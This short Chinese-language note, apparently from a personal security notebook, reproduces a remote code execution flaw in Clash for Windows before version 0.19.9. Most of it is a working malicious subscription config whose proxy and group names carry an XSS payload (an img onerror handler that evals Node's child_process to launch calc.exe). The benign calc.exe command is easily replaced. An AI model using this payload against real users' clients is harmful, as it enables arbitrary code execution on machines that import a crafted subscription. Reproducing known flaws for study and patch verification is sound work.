# Windows专区

参考资料：[Clash For Windows远程代码执行漏洞复现&分析 (qu1u1.cn)](https://qu1u1.cn/archives/clashforwindows远程代码执行漏洞复现分析)







## Clash for Windows --RCE

版本是在 0.19.9之前

代理规则配置文件中没有设置严格的输入检测，攻击者可以伪造代理配置文件利用XSS payload进行攻击



如订阅文件：

将xss代码插入proxies中进行攻击。

proxies中的name字段嵌入html标签，onerror时触发语句执行



```
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>



```

